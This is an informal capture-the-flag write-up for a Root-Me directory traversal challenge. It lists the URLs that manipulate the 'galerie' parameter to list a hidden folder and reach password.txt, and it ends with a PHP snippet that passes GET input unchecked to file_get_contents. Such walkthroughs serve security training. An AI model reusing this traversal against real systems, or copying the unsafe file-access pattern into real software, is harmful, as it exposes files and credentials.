# Directory traversal



Initial address:

http://challenge01.root-me.org/web-serveur/ch15/ch15.php

\->

Then directory traversal:

http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=./

(it shows the all the elements in that directory)

\->

**(maybe it take some thing from that galarie param as GET request and then do ls): that is, param=../../ -> and that directory is processed with ls like command such that**

http://challenge01.root-me.org/web-serveur/ch15/ch15.php?galerie=86hwnX2r

\->

Then by 'open image in new tab'

http://challenge01.root-me.org/web-serveur/ch15/galerie/86hwnX2r/password.txt

***

source code.php

```
/**
* Get the filename from a GET input
* Example - https://example-website.com/?file=filename.php
*/
$file = $_GET[‘file’];

/**
* Unsafely include the file
* Example: filename.php
*/
file_get_contents(‘directory/’ . $file);
```
